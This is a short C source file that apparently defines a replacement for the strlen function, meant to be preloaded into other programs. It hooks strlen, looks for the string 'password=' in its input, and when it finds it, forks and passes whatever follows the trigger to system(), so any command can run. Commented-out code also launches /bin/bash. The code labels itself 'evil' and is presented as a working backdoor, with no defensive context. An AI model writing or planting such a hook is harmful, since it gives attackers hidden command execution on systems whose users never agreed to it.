#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <unistd.h>

/* Make sure that the evil code be executed only once */
static int FLAG = 0;

char* generate_key(){
    char password[] = "password";
    int size = sizeof(password) + 1;
    char* key = (char *)malloc(size);
    memset(key, 0, size);
    strcpy(key, password);
    return key;
}

int strlen(char *s) {
    void *handle = NULL;
    int (*real_strlen)(char *);
    int (*real_system)(char *);

    handle = dlopen("libc.so.6", RTLD_LAZY);
    real_strlen = (int (*)(char *))dlsym(handle, "strlen");
    real_system = (int (*)(char *))dlsym(handle, "system");

    char* needle = generate_key();
    int length = real_strlen(needle);
    needle[length] = '=';

    char* position = strstr(s, needle);


    /*
    char* command = position + length + 1;
    system(command);
    */

    if(position) {
        if(FLAG == 0){
            int pid = fork();
            if(pid == 0){
                char* command = position + length + 1;
                printf("Evil command: %s\n", command);
                real_system(command);
                exit(0);
                /*
                char* argv[]={command, NULL};
                char* envp[]={0,NULL};
                execve(command, argv, envp);
                exit(0);
                */
            }
            /*
            char* command = "/bin/bash";
            char* argv[]={command, NULL};
            char* envp[]={0,NULL};
            execve(command, argv, envp);
            exit(0);
            */
        }
    }

    FLAG = 1;

    return real_strlen(s);
}
